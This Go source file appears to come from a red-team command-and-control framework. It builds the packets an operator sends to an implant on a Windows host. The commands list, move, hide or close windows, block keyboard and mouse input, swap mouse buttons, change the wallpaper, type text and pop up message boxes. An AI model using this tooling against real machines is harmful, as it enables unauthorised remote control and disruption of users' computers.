//go:build !implant

// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package task

import (
	"io"
	"os"
	"time"

	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/device"
)

// WindowList returns a list active Windows Packet. This will instruct the
// client to return a list of the current open Windows with detailed information.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvWindowList
//
//  Input:
//      <none>
//  Output:
//      uint32     // Count
//      []Window { // List of open Windows
//          uint64 // Handle
//          string // Title
//          uint32 // Position X
//          uint32 // Position Y
//          uint32 // Width
//          uint32 // Height
//      }
func WindowList() *com.Packet {
	return &com.Packet{ID: TvWindowList}
}

// SwapMouse returns a swap mouse buttons Packet. This will instruct the client
// swap the mouse buttons. The buttons will stay swapped until a successful call
// to 'SwapMouse' with false.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvTroll
//
//  Input:
//      uint8  // Can be 0 or 1 depending on the state set.
//  Output:
//      <none>
func SwapMouse(e bool) *com.Packet {
	n := &com.Packet{ID: TvTroll}
	if e {
		n.WriteUint8(taskTrollSwapEnable)
	} else {
		n.WriteUint8(taskTrollSwapDisable)
	}
	return n
}

// BlockInput returns a block user input Packet. This will instruct the client
// to block all user supplied input (keyboard and mouse). Input will be blocked
// until a successful call to 'BlockInput' with false.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvTroll
//
//  Input:
//      uint8  // Can be 6 or 7 depending on the state set.
//  Output:
//      <none>
func BlockInput(e bool) *com.Packet {
	n := &com.Packet{ID: TvTroll}
	if e {
		n.WriteUint8(taskTrollBlockInputEnable)
	} else {
		n.WriteUint8(taskTrollBlockInputDisable)
	}
	return n
}

// Wallpaper returns a change user wallpaper Packet. This will instruct the client
// to change the current users's wallpaper to the filepath provided.
//
// The destination path may contain environment variables that will be resolved
// during runtime.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvTroll
//
//  Input:
//      uint8  // Always set to 5 for this task.
//      string // Destination
//  Output:
//      <none>
func Wallpaper(s string) *com.Packet {
	n := &com.Packet{ID: TvTroll}
	n.WriteUint8(taskTrollWallpaperPath)
	n.WriteString(s)
	return n
}

// HighContrast returns a set HighContrast theme Packet. This will instruct the
// client to set the theme to HighContrast. The theme will be set until a successful
// call to 'HighContrast' with false.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvTroll
//
//  Input:
//      uint8  // Can be 2 or 3 depending on the state set.
//  Output:
//      <none>
func HighContrast(e bool) *com.Packet {
	n := &com.Packet{ID: TvTroll}
	if e {
		n.WriteUint8(taskTrollHcEnable)
	} else {
		n.WriteUint8(taskTrollHcDisable)
	}
	return n
}

// WindowFocus returns a activate/focus window Packet. This will instruct the
// client to focus the target window and show it to the user.
//
// Using the value "0" for the handle will select all open windows that exist
// during client runtime.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvUI
//
//  Input:
//      uint8  // Always 7 for this task.
//      uint64 // Handle
//  Output:
//      <none>
func WindowFocus(h uint64) *com.Packet {
	n := &com.Packet{ID: TvUI}
	n.WriteUint8(taskWindowFocus)
	n.WriteUint64(h)
	return n
}

// WindowClose returns a close window Packet. This will instruct the client to
// close the target window.
//
// Using the value "0" for the handle will select all open windows that exist
// during client runtime.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvUI
//
//  Input:
//      uint8  // Always 4 for this task.
//      uint64 // Handle
//  Output:
//      <none>
func WindowClose(h uint64) *com.Packet {
	n := &com.Packet{ID: TvUI}
	n.WriteUint8(taskWindowClose)
	n.WriteUint64(h)
	return n
}

// WallpaperBytes returns a change user wallpaper Packet. This will instruct the
// client to change the current users's wallpaper to the data contained in the
// supplied byte slice. The new file will be written in a temporary location
// before being used as a wallpaper.
//
// The destination path may contain environment variables that will be resolved
// during runtime.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvTroll
//
//  Input:
//      uint8  // Always set to 4 for this task.
//      []byte // File Data
//  Output:
//      <none>
func WallpaperBytes(b []byte) *com.Packet {
	n := &com.Packet{ID: TvTroll}
	n.WriteUint8(taskTrollWallpaper)
	n.Write(b)
	return n
}

// WindowWTF returns a window WTF mode Packet. This will instruct the client to
// do some crazy things with the active windows for the supplied duration.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvUI
//
//  Input:
//      uint8 // Always 8 for this task.
//      int64 // Duration
//  Output:
//      <none>
func WindowWTF(d time.Duration) *com.Packet {
	n := &com.Packet{ID: TvTroll}
	n.WriteUint8(taskTrollWTF)
	n.WriteInt64(int64(d))
	return n
}

// WindowShow returns a show window Packet. This will instruct the client to
// change the window's active show state.
//
// Using the value "0" for the handle will select all open windows that exist
// during client runtime.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvUI
//
//  Input:
//      uint8  // Always 3 for this task.
//      uint64 // Handle
//      uint8  // Sw* Constant
//  Output:
//      <none>
func WindowShow(h uint64, t uint8) *com.Packet {
	n := &com.Packet{ID: TvUI}
	n.WriteUint8(taskWindowShow)
	n.WriteUint64(h)
	n.WriteUint8(t)
	return n
}

// WindowEnable returns a enable/disable window Packet. This will instruct the
// client to block all user supplied input (keyboard and mouse) to the specified
// window handle. Input will be blocked and the window will not be usable until
// a successful call to 'WindowEnable' with the handle and false.
//
// Using the value "0" for the handle will select all open windows that exist
// during client runtime.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvUI
//
//  Input:
//      uint8  // Can be 0 or 1 depending on the state set.
//      uint64 // Handle
//  Output:
//      <none>
func WindowEnable(h uint64, e bool) *com.Packet {
	n := &com.Packet{ID: TvUI}
	if e {
		n.WriteUint8(taskWindowEnable)
	} else {
		n.WriteUint8(taskWindowDisable)
	}
	n.WriteUint64(h)
	return n
}

// WallpaperFile returns a change user wallpaper Packet. This will instruct the
// client to change the current users's wallpaper to the supplied (server local)
// file. The new file will be written in a temporary location before being used
// as a wallpaper.
//
// The destination path may contain environment variables that will be resolved
// during runtime.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvTroll
//
//  Input:
//      uint8  // Always set to 4 for this task.
//      []byte // File Data
//  Output:
//      <none>
func WallpaperFile(s string) (*com.Packet, error) {
	// 0 - READONLY
	f, err := os.OpenFile(device.Expand(s), 0, 0)
	if err != nil {
		return nil, err
	}
	n, err := WallpaperReader(f)
	f.Close()
	return n, err
}

// WindowSendInput returns a type input Packet. This will instruct the client to
// use input events to type out the provied string. The client will first attempt
// to bring the window supplied to the foreground (if non-zero) before typing.
//
// The window value is optional and may be set to zero.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvUI
//
//  Input:
//      uint8  // Always 8 for this task.
//      uint64 // Handle
//      string // Text
//  Output:
//      <none>
func WindowSendInput(h uint64, s string) *com.Packet {
	n := &com.Packet{ID: TvUI}
	n.WriteUint8(taskWindowType)
	n.WriteUint64(h)
	n.WriteString(s)
	return n
}

// WindowTransparency returns a set window transparency Packet. This will instruct
// the client to set the window with the supplied handle with the specified
// transparency value. This value ranges from 0 (transparent) to 255 (opaque).
//
// Using the value "0" for the handle will select all open windows that exist
// during client runtime.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvUI
//
//  Input:
//      uint8  // Always 2 for this task.
//      uint64 // Handle
//  Output:
//      <none>
func WindowTransparency(h uint64, v byte) *com.Packet {
	n := &com.Packet{ID: TvUI}
	n.WriteUint8(taskWindowTransparency)
	n.WriteUint64(h)
	n.WriteUint8(v)
	return n
}

// WallpaperReader returns a change user wallpaper Packet. This will instruct the
// client to change the current users's wallpaper to the data contained in the
// supplied reader. The new file will be written in a temporary location before
// being used as a wallpaper.
//
// The destination path may contain environment variables that will be resolved
// during runtime.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvTroll
//
//  Input:
//      uint8  // Always set to 4 for this task.
//      []byte // File Data
//  Output:
//      <none>
func WallpaperReader(r io.Reader) (*com.Packet, error) {
	n := &com.Packet{ID: TvTroll}
	n.WriteUint8(taskTrollWallpaper)
	_, err := io.Copy(n, r)
	return n, err
}

// WindowMove returns a move/resize window Packet. This will instruct the client
// to move and/or resize the targeted window with the supplied options.
//
// The value '-1' may be used in either the 'X' and 'Y' or the 'Width' and 'Height'
// values to keep the current values instead of changing them.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvUI
//
//  Input:
//      uint8  // Always 6 for this task.
//      uint64 // Handle
//      uint32 // X
//      uint32 // Y
//      uint32 // Width
//      uint32 // Hight
//  Output:
//      <none>
func WindowMove(h uint64, x, y, width, height int32) *com.Packet {
	n := &com.Packet{ID: TvUI}
	n.WriteUint8(taskWindowMove)
	n.WriteUint64(h)
	n.WriteInt32(x)
	n.WriteInt32(y)
	n.WriteInt32(width)
	n.WriteInt32(height)
	return n
}

// WindowMessageBox returns a MessageBox Packet. This will instruct the client to
// create a MessageBox with the supplied parent and message options.
//
// Using the value "0" for the handle will create a MessageBox without a parent
// window.
//
// If the handle 'h' is '-1', or "^uintptr(0)", this will attempt
// to target the Desktop window, which will fallback to '0' if it fails.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvUI
//
//  Input:
//      uint8  // Always 5 for this task.
//      uint64 // Handle
//      string // Title
//      string // Text
//      uint32 // Flags
//  Output:
//      <none>
func WindowMessageBox(h uint64, title, text string, flags uint32) *com.Packet {
	n := &com.Packet{ID: TvUI}
	n.WriteUint8(taskWindowMessage)
	n.WriteUint64(h)
	n.WriteUint32(flags)
	n.WriteString(title)
	n.WriteString(text)
	return n
}
